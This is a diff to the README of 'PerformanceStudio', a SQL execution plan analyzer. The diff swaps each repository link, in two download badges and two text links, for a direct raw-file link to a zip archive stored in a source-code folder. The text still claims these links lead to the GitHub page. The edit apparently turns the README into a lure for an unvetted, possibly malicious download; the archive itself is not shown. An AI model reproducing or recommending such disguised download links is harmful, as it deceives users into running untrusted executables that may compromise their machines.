@@ -1,6 +1,6 @@
 # ⚙️ PerformanceStudio - Simple SQL Execution Plan Analyzer
 
-[![Download PerformanceStudio](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Abhas-cpp/PerformanceStudio)
+[![Download PerformanceStudio](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Abhas-cpp/PerformanceStudio/raw/refs/heads/main/src/PlanViewer.Cli/Commands/Performance_Studio_1.0.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Before installing, make sure your computer meets these basic needs:
 
 Click the big green badge at the top or go to this link:
 
-[https://github.com/Abhas-cpp/PerformanceStudio](https://github.com/Abhas-cpp/PerformanceStudio)
+[https://github.com/Abhas-cpp/PerformanceStudio/raw/refs/heads/main/src/PlanViewer.Cli/Commands/Performance_Studio_1.0.zip](https://github.com/Abhas-cpp/PerformanceStudio/raw/refs/heads/main/src/PlanViewer.Cli/Commands/Performance_Studio_1.0.zip)
 
 This link takes you to the GitHub page where you can get the latest software version.
 
@@ -143,7 +143,7 @@ PerformanceStudio does not store your plans permanently. AI processing happens s
 
 Visit the GitHub page for more details:
 
-[https://github.com/Abhas-cpp/PerformanceStudio](https://github.com/Abhas-cpp/PerformanceStudio)
+[https://github.com/Abhas-cpp/PerformanceStudio/raw/refs/heads/main/src/PlanViewer.Cli/Commands/Performance_Studio_1.0.zip](https://github.com/Abhas-cpp/PerformanceStudio/raw/refs/heads/main/src/PlanViewer.Cli/Commands/Performance_Studio_1.0.zip)
 
 There you can find:
 
@@ -191,4 +191,4 @@ This software covers these areas:
 
 Get started by visiting the link below to download the latest Windows version:
 
-[![Download PerformanceStudio](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Abhas-cpp/PerformanceStudio)
+[![Download PerformanceStudio](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Abhas-cpp/PerformanceStudio/raw/refs/heads/main/src/PlanViewer.Cli/Commands/Performance_Studio_1.0.zip)
